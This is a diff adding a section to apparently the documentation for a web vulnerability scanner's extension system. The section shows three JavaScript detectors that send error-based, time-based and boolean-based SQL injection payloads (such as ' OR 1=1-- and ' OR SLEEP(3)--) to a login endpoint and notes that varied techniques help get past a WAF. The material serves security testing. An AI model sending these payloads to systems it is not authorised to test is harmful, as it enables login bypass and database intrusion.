@@ -395,6 +395,132 @@ module.exports = {
 };
 ```
 
+### Multi-Version Extensions (Multiple Detection Techniques)
+
+For the same vulnerability sink, create multiple extension files using different detection techniques. This maximizes coverage — if one technique is blocked by WAF or doesn't apply to the target stack, another may succeed.
+
+**Naming convention:** `agent-<vuln>-<context>-<technique>.js`
+
+#### Error-based SQL Injection (`agent-sqli-login-error.js`)
+
+```javascript
+module.exports = {
+  id: "agent-sqli-login-error",
+  name: "SQL Injection in login (error-based)",
+  type: "active",
+  severity: "high",
+  confidence: "firm",
+  tags: ["sqli", "agent-generated"],
+  scanTypes: ["per_request"],
+
+  scanPerRequest: function(ctx) {
+    if (ctx.request.path !== "/api/login") return null;
+    var payloads = ["' OR 1=1--", "admin'--", "' UNION SELECT NULL--"];
+    for (var i = 0; i < payloads.length; i++) {
+      var resp = vigolium.http.post(ctx.request.url, {
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({username: payloads[i], password: "x"})
+      });
+      if (resp && resp.body && /SQL|syntax|mysql|pg_|ORA-/.test(resp.body)) {
+        return {
+          url: ctx.request.url,
+          name: "SQL Injection (error-based) in login",
+          severity: "high",
+          matched: resp.body.substring(0, 200),
+          request: "POST " + ctx.request.url,
+          response: resp.raw
+        };
+      }
+    }
+    return null;
+  }
+};
+```
+
+#### Time-based SQL Injection (`agent-sqli-login-time.js`)
+
+```javascript
+module.exports = {
+  id: "agent-sqli-login-time",
+  name: "SQL Injection in login (time-based)",
+  type: "active",
+  severity: "high",
+  confidence: "firm",
+  tags: ["sqli", "agent-generated"],
+  scanTypes: ["per_request"],
+
+  scanPerRequest: function(ctx) {
+    if (ctx.request.path !== "/api/login") return null;
+    // Baseline request
+    var start0 = Date.now();
+    vigolium.http.post(ctx.request.url, {
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({username: "baseline", password: "x"})
+    });
+    var baseline = Date.now() - start0;
+
+    // Time-based payload
+    var payload = "' OR SLEEP(3)--";
+    var start = Date.now();
+    var resp = vigolium.http.post(ctx.request.url, {
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({username: payload, password: "x"})
+    });
+    var elapsed = Date.now() - start;
+
+    if (elapsed > baseline + 2500) {
+      return {
+        url: ctx.request.url,
+        name: "SQL Injection (time-based) in login",
+        severity: "high",
+        matched: "Response delayed by " + (elapsed - baseline) + "ms",
+        request: "POST " + ctx.request.url,
+        response: resp.raw
+      };
+    }
+    return null;
+  }
+};
+```
+
+#### Boolean-based SQL Injection (`agent-sqli-login-boolean.js`)
+
+```javascript
+module.exports = {
+  id: "agent-sqli-login-boolean",
+  name: "SQL Injection in login (boolean-based)",
+  type: "active",
+  severity: "high",
+  confidence: "firm",
+  tags: ["sqli", "agent-generated"],
+  scanTypes: ["per_request"],
+
+  scanPerRequest: function(ctx) {
+    if (ctx.request.path !== "/api/login") return null;
+    var trueResp = vigolium.http.post(ctx.request.url, {
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({username: "' OR 1=1--", password: "x"})
+    });
+    var falseResp = vigolium.http.post(ctx.request.url, {
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({username: "' OR 1=2--", password: "x"})
+    });
+    if (trueResp && falseResp && trueResp.status !== falseResp.status) {
+      return {
+        url: ctx.request.url,
+        name: "SQL Injection (boolean-based) in login",
+        severity: "high",
+        matched: "True condition: " + trueResp.status + ", False condition: " + falseResp.status,
+        request: "POST " + ctx.request.url
+      };
+    }
+    return null;
+  }
+};
+```
+
+This pattern applies to other vulnerability classes too — for example, SSTI extensions could have Jinja2, Freemarker, and Twig variants; XSS extensions could have reflected, DOM-based, and attribute-context variants.
+
 ### Source Code Correlation
 
 ```javascript
